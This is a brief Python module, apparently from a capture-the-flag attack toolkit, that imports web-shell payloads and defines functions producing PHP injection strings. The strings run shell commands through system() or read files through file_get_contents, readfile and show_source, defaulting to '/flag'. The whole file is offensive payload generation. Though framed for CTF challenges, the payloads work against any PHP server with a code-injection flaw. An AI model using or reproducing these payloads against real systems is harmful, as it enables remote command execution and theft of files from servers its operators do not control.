#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
from payloads.webshell import *


def exp_system(cmd="cat /flag"):
    return "system('%s');" % cmd


def exp_file_get_contents(path="/flag"):
    return "echo file_get_contents('%s');" % path


def exp_readfile(path="/flag"):
    return "echo readfile('%s');" % path


def exp_show_source(path="/flag"):
    return "echo show_source('%s');" % path
